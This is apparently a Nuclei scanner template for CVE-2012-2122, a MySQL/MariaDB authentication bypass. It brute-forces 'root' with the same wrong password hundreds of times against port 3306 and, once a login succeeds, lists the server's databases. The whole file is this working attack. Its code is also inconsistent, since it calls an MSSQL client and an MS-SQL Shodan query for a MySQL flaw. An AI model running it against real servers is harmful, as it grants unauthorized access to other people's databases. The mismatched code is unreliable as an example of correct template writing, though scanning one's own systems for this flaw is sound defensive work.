id: CVE-2012-2122

info:
  name: MySQL - Authentication Bypass
  author: pussycat0x
  severity: critical
  description: |
    sql/password.c in Oracle MySQL 5.1.x before 5.1.63, 5.5.x before 5.5.24, and 5.6.x before 5.6.6, and MariaDB 5.1.x before 5.1.62, 5.2.x before 5.2.12, 5.3.x before 5.3.6, and 5.5.x before 5.5.23, when running in certain environments with certain implementations of the memcmp function, allows remote attackers to bypass authentication by repeatedly authenticating with the same incorrect password, which eventually causes a token comparison to succeed due to an improperly-checked return value.
  reference:
    - https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122
  metadata:
    verified: true
    shodan-query: product:"MS-SQL Server"
  tags: js,enum,network,mssql

javascript:
  - code: |
      let m = require('nuclei/mssql');
      let c = m.MSSQLClient();
      let response = c.ExecuteQuery(Host,Port,User,Pass,Query);
      response;

    args:
      Host: "{{Host}}"
      Port: 3306
      User: "{{usernames}}"
      Pass: "{{passwords}}"
      Query: "show databases;"

    attack: pitchfork
    payloads:
      usernames:
        - "root"
      passwords:
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"

    matchers:
      - type: dsl
        dsl:
          - "success == true"
    extractors:
      - type: json
        part: response
        json:
          - .Rows[] | .Database
